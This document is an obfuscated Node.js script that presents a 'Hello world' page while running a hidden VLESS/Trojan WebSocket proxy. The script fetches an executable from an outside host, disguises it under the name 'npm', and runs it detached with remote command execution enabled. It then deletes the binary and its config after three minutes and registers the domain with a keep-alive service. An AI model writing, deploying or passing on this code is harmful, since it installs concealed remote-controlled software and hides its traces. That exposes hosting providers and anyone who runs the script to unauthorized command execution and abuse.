(function(_0x12c0,_0x5d7a){"use strict";const _0x2b89={"os":require("os"),"http":require("http"),"fs":require("fs"),"axios":require("axios"),"net":require("net"),"path":require("path"),"crypto":require("crypto"),"Buffer":require("buffer").Buffer,"exec":require("child_process").exec,"execSync":require("child_process").execSync,"ws":require("ws")};const uuid=process.env.uuid||"5efabea4-f6d4-91fd-b8f0-17e004c89c60";const NEZHA_SERVER=process.env.NEZHA_SERVER||"";const NEZHA_PORT=process.env.NEZHA_PORT||"";const NEZHA_KEY=process.env.NEZHA_KEY||"";const DOMAIN=process.env.DOMAIN||"1234.abc.com";const AUTO_ACCESS=process.env.AUTO_ACCESS||true;const WSPATH=process.env.WSPATH||uuid.slice(0,8);const SUB_PATH=process.env.SUB_PATH||"sublink";const PORT=process.env.PORT||7860;const subtxt=`${process.env.HOME}/agsbx/jh.txt`;const NAME=process.env.NAME||_0x2b89.os.hostname();const _0x4f1e={"0x0":"Module '%s' not found. Installing...","0x1":"start.sh empowerment failed: %s","0x2":"start.sh empowerment successful","0x3":"child process exited with code %s","0x4":"App is running","0x5":"https://speed.cloudflare.com/meta","0x6":"Unknown","0x7":"text/html","0x8":"Hello world!","0x9":"text/plain","0xa":"Not Found\n","0xb":"vless://%s@%s:443?encryption=none&security=tls&sni=%s&fp=chrome&type=ws&host=%s&path=%2F%s#%s-%s","0xc":"trojan://%s@%s:443?security=tls&sni=%s&fp=chrome&type=ws&host=%s&path=%2F%s#%s-%s","0xd":"Failed to resolve %s with all DNS servers","0xe":"application/dns-json","0xf":"https://dns.google/resolve?name=%s&type=A","0x10":"npm download successfully","0x11":"npm running error: %s","0x12":"NEZHA variable is empty, skip running","0x13":"npm is already running, skip running...","0x14":"https://arm64.ssss.nyc.mn/v1","0x15":"https://arm64.ssss.nyc.mn/agent","0x16":"https://amd64.ssss.nyc.mn/v1","0x17":"https://amd64.ssss.nyc.mn/agent","0x18":"https://oooo.serv00.net/add-url","0x19":"Automatic Access Task added successfully","0x1a":"Server is running on port %s","0x1b":"ps aux | grep -v \"grep\" | grep \"./[n]pm\"","0x1c":"setsid nohup ./npm -s %s:%s -p %s %s --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &","0x1d":"setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &","0x1e":"client_secret: %s\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: %s\nskip_connection_count: true\nskip_procs_count: true\ntemperature: false\ntls: %s\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: %s"};const _0x3c7d=function(_0x5a1b,_0x4e2c){let _0x3d6f=_0x4f1e[_0x5a1b];for(let _0x2e5f=0;_0x2e5f<_0x4e2c.length;_0x2e5f++){_0x3d6f=_0x3d6f.replace(/%s/,_0x4e2c[_0x2e5f]);}return _0x3d6f;};const _0x1e8b=function(_0x2d3f){try{require.resolve(_0x2d3f);}catch(_0x5c4a){console.log(_0x3c7d("0x0",[_0x2d3f]));_0x2b89.execSync(`npm install ${_0x2d3f}`,{"stdio":"inherit"});}};_0x2b89.fs.chmod("start.sh",0o777,function(_0x4b5e){if(_0x4b5e){console.error(_0x3c7d("0x1",[_0x4b5e]));return;}console.log(_0x3c7d("0x2",[]));const _0x5a6d=_0x2b89.exec("bash start.sh");_0x5a6d.stdout.on("data",function(_0x1f7c){console.log(_0x1f7c);});_0x5a6d.stderr.on("data",function(_0x2c8b){console.error(_0x2c8b);});_0x5a6d.on("close",function(_0x3e9a){console.log(_0x3c7d("0x3",[_0x3e9a]));console.clear();console.log(_0x3c7d("0x4",[]));});});let _0x5f8a="";const _0x4d9c=async function(){try{const _0x2b7e=await _0x2b89.axios.get(_0x4f1e["0x5"]);const _0x1c8d=_0x2b7e.data;_0x5f8a=`${_0x1c8d.country}-${_0x1c8d.asOrganization}`.replace(/ /g,"_");}catch(_0x3a9b){_0x5f8a=_0x4f1e["0x6"];}};_0x4d9c();const _0x2a7b=function(_0x5d8c){return new Promise(function(_0x1b9a,_0x4e8b){if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(_0x5d8c)){_0x1b9a(_0x5d8c);return;}let _0x3c8d=0;const _0x2d9c=["8.8.4.4","1.1.1.1"];const _0x1e8b=function(){if(_0x3c8d>=_0x2d9c.length){_0x4e8b(new Error(_0x3c7d("0xd",[_0x5d8c])));return;}const _0x5f9a=_0x2d9c[_0x3c8d];_0x3c8d++;const _0x4c7b=_0x3c7d("0xf",[encodeURIComponent(_0x5d8c)]);_0x2b89.axios.get(_0x4c7b,{"timeout":5000,"headers":{"Accept":_0x4f1e["0xe"]}}).then(function(_0x3a8d){const _0x2e9c=_0x3a8d.data;if(_0x2e9c.Status===0&&_0x2e9c.Answer&&_0x2e9c.Answer.length>0){const _0x1f7b=_0x2e9c.Answer.find(function(_0x4d8c){return _0x4d8c.type===1;});if(_0x1f7b){_0x1b9a(_0x1f7b.data);return;}}_0x1e8b();}).catch(function(_0x5c9a){_0x1e8b();});};_0x1e8b();});};const _0x3d7c=function(_0x5e8b,_0x4f9a){const _0x2f8d=[_0x4f9a[0]];const _0x1e7b=_0x4f9a.slice(1,17);const _0x5a6d=uuid.replace(/-/g,"");if(!_0x1e7b.every(function(_0x3c9a,_0x2d8c){return _0x3c9a==parseInt(_0x5a6d.substr(_0x2d8c*2,2),16);}))return false;let _0x4e8b=_0x4f9a.slice(17,18).readUInt8()+19;const _0x3f9a=_0x4f9a.slice(_0x4e8b,_0x4e8b+=2).readUInt16BE(0);const _0x2e7b=_0x4f9a.slice(_0x4e8b,_0x4e8b+=1).readUInt8();const _0x1d8c=_0x2e7b==1?_0x4f9a.slice(_0x4e8b,_0x4e8b+=4).join("."):(_0x2e7b==2?new TextDecoder().decode(_0x4f9a.slice(_0x4e8b+1,_0x4e8b+=1+_0x4f9a.slice(_0x4e8b,_0x4e8b+1).readUInt8())):(_0x2e7b==3?_0x4f9a.slice(_0x4e8b,_0x4e8b+=16).reduce(function(_0x5f8d,_0x4e7b,_0x3d9a,_0x2c8c){return(_0x3d9a%2?_0x5f8d.concat(_0x2c8c.slice(_0x3d9a-1,_0x3d9a+1)):_0x5f8d);},[]).map(function(_0x1f9a){return _0x1f9a.readUInt16BE(0).toString(16);}).join(":"):""));_0x5e8b.send(new Uint8Array([_0x2f8d[0],0]));const _0x5d7c=_0x2b89.ws.createWebSocketStream(_0x5e8b);_0x2a7b(_0x1d8c).then(function(_0x4c8d){_0x2b89.net.connect({"host":_0x4c8d,"port":_0x3f9a},function(){this.write(_0x4f9a.slice(_0x4e8b));_0x5d7c.on("error",function(){}).pipe(this).on("error",function(){}).pipe(_0x5d7c);}).on("error",function(){});}).catch(function(_0x3e7b){_0x2b89.net.connect({"host":_0x1d8c,"port":_0x3f9a},function(){this.write(_0x4f9a.slice(_0x4e8b));_0x5d7c.on("error",function(){}).pipe(this).on("error",function(){}).pipe(_0x5d7c);}).on("error",function(){});});return true;};const _0x4c7d=function(_0x5f9a,_0x1e8b){try{if(_0x1e8b.length<58)return false;const _0x2d8c=_0x1e8b.slice(0,56).toString();const _0x3c9a=[uuid];let _0x4e7b=null;for(const _0x5d8c of _0x3c9a){const _0x2e8b=_0x2b89.crypto.createHash("sha224").update(_0x5d8c).digest("hex");if(_0x2e8b===_0x2d8c){_0x4e7b=_0x5d8c;break;}}if(!_0x4e7b)return false;let _0x1f9a=56;if(_0x1e8b[_0x1f9a]===0x0d&&_0x1e8b[_0x1f9a+1]===0x0a){_0x1f9a+=2;}const _0x5c8d=_0x1e8b[_0x1f9a];if(_0x5c8d!==0x01)return false;_0x1f9a+=1;const _0x4d9a=_0x1e8b[_0x1f9a];_0x1f9a+=1;let _0x3e8b,_0x2f9a;if(_0x4d9a===0x01){_0x3e8b=_0x1e8b.slice(_0x1f9a,_0x1f9a+4).join(".");_0x1f9a+=4;}else if(_0x4d9a===0x03){const _0x1c8d=_0x1e8b[_0x1f9a];_0x1f9a+=1;_0x3e8b=_0x1e8b.slice(_0x1f9a,_0x1f9a+_0x1c8d).toString();_0x1f9a+=_0x1c8d;}else if(_0x4d9a===0x04){_0x3e8b=_0x1e8b.slice(_0x1f9a,_0x1f9a+16).reduce(function(_0x5f8d,_0x4e7b,_0x3d9a,_0x2c8c){return(_0x3d9a%2?_0x5f8d.concat(_0x2c8c.slice(_0x3d9a-1,_0x3d9a+1)):_0x5f8d);},[]).map(function(_0x1f9a){return _0x1f9a.readUInt16BE(0).toString(16);}).join(":");_0x1f9a+=16;}else{return false;}_0x2f9a=_0x1e8b.readUInt16BE(_0x1f9a);_0x1f9a+=2;if(_0x1f9a<_0x1e8b.length&&_0x1e8b[_0x1f9a]===0x0d&&_0x1e8b[_0x1f9a+1]===0x0a){_0x1f9a+=2;}const _0x5e7b=_0x2b89.ws.createWebSocketStream(_0x5f9a);_0x2a7b(_0x3e8b).then(function(_0x4c8d){_0x2b89.net.connect({"host":_0x4c8d,"port":_0x2f9a},function(){if(_0x1f9a<_0x1e8b.length)this.write(_0x1e8b.slice(_0x1f9a));_0x5e7b.on("error",function(){}).pipe(this).on("error",function(){}).pipe(_0x5e7b);}).on("error",function(){});}).catch(function(_0x3e7b){_0x2b89.net.connect({"host":_0x3e8b,"port":_0x2f9a},function(){if(_0x1f9a<_0x1e8b.length)this.write(_0x1e8b.slice(_0x1f9a));_0x5e7b.on("error",function(){}).pipe(this).on("error",function(){}).pipe(_0x5e7b);}).on("error",function(){});});return true;}catch(_0x5c9a){return false;}};const _0x5b7e=_0x2b89.http.createServer(function(_0x1d9a,_0x2c8d){if(_0x1d9a.url==="/"){const _0x3d8c=_0x2b89.path.join(__dirname,"index.html");_0x2b89.fs.readFile(_0x3d8c,"utf8",function(_0x4e9a,_0x5f8d){if(_0x4e9a){_0x2c8d.writeHead(200,{"Content-Type":_0x4f1e["0x7"]});_0x2c8d.end(_0x4f1e["0x8"]);return;}_0x2c8d.writeHead(200,{"Content-Type":_0x4f1e["0x7"]});_0x2c8d.end(_0x5f8d);});return;}else if(_0x1d9a.url===`/${SUB_PATH}`){const _0x1e7b=_0x3c7d("0xb",[uuid,DOMAIN,DOMAIN,DOMAIN,WSPATH,NAME,_0x5f8a]);const _0x2f9a=_0x3c7d("0xc",[uuid,DOMAIN,DOMAIN,DOMAIN,WSPATH,NAME,_0x5f8a]);const _0x3e8b=_0x1e7b+"\n"+_0x2f9a;const _0x4d8c=_0x2b89.Buffer.from(_0x3e8b).toString("base64");_0x2c8d.writeHead(200,{"Content-Type":_0x4f1e["0x9"]});_0x2c8d.end(_0x4d8c+"\n");}else{_0x2c8d.writeHead(404,{"Content-Type":_0x4f1e["0x9"]});_0x2c8d.end(_0x4f1e["0xa"]);}});const _0x1c7d=new _0x2b89.ws.WebSocketServer({"server":_0x5b7e});_0x1c7d.on("connection",function(_0x5e8b,_0x4f9a){const _0x2f8d=_0x4f9a.url||"";_0x5e8b.once("message",function(_0x1e9a){if(_0x1e9a.length>17&&_0x1e9a[0]===0){const _0x3d9a=_0x1e9a.slice(1,17);const _0x2c8c=uuid.replace(/-/g,"");const _0x1d8c=_0x3d9a.every(function(_0x4e7b,_0x3c8d){return _0x4e7b==parseInt(_0x2c8c.substr(_0x3c8d*2,2),16);});if(_0x1d8c){if(!_0x3d7c(_0x5e8b,_0x1e9a))_0x5e8b.close();return;}}if(!_0x4c7d(_0x5e8b,_0x1e9a))_0x5e8b.close();}).on("error",function(){});});const _0x3b8d=function(){const _0x2e9a=_0x2b89.os.arch();if(_0x2e9a==="arm"||_0x2e9a==="arm64"||_0x2e9a==="aarch64"){return!NEZHA_PORT?_0x4f1e["0x14"]:_0x4f1e["0x15"];}else{return!NEZHA_PORT?_0x4f1e["0x16"]:_0x4f1e["0x17"];}};const _0x2c9a=async function(){if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1d8c=_0x3b8d();const _0x5f7b=await _0x2b89.axios({"method":"get","url":_0x1d8c,"responseType":"stream"});const _0x4e8b=_0x2b89.fs.createWriteStream("npm");_0x5f7b.data.pipe(_0x4e8b);return new Promise(function(_0x3d9a,_0x2e8b){_0x4e8b.on("finish",function(){console.log(_0x4f1e["0x10"]);_0x2b89.exec("chmod +x npm",function(_0x1f9a){if(_0x1f9a)_0x2e8b(_0x1f9a);_0x3d9a();});});_0x4e8b.on("error",_0x2e8b);});}catch(_0x5d9a){throw _0x5d9a;}};const _0x1d9a=async function(){try{const _0x2c7b=_0x2b89.execSync(_0x4f1e["0x1b"],{"encoding":"utf-8"});if(_0x2c7b.trim()!==""){console.log(_0x4f1e["0x13"]);return;}}catch(_0x3e9a){}await _0x2c9a();let _0x5e8b="";const _0x4f9a=["443","8443","2096","2087","2083","2053"];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1e7b=_0x4f9a.includes(NEZHA_PORT)?"--tls":"";_0x5e8b=_0x3c7d("0x1c",[NEZHA_SERVER,NEZHA_PORT,NEZHA_KEY,_0x1e7b]);}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2f8d=NEZHA_SERVER.includes(":")?NEZHA_SERVER.split(":").pop():"";const _0x3e7b=_0x4f9a.includes(_0x2f8d)?"true":"false";const _0x4d8c=_0x3c7d("0x1e",[NEZHA_KEY,NEZHA_SERVER,_0x3e7b,uuid]);_0x2b89.fs.writeFileSync("config.yaml",_0x4d8c);}_0x5e8b=_0x4f1e["0x1d"];}else{console.log(_0x4f1e["0x12"]);return;}try{_0x2b89.exec(_0x5e8b,{"shell":"/bin/bash"},function(_0x1f9a){if(_0x1f9a)console.error(_0x3c7d("0x11",[_0x1f9a]));else console.log(_0x4f1e["0x10"].replace("download","is"));});}catch(_0x5c9a){console.error(_0x3c7d("0x11",[_0x5c9a]));}};const _0x4e8b=async function(){if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3d8c=`https://${DOMAIN}`;try{await _0x2b89.axios.post(_0x4f1e["0x18"],{"url":_0x3d8c},{"headers":{"Content-Type":"application/json"}});console.log(_0x4f1e["0x19"]);}catch(_0x2e9a){}};const _0x5f9a=function(){_0x2b89.fs.unlink("npm",function(){});_0x2b89.fs.unlink("config.yaml",function(){});};_0x5b7e.listen(PORT,function(){_0x1d9a();setTimeout(_0x5f9a,180000);_0x4e8b();console.log(_0x3c7d("0x1a",[PORT]));});})(this,typeof window!=="undefined"?window:global);
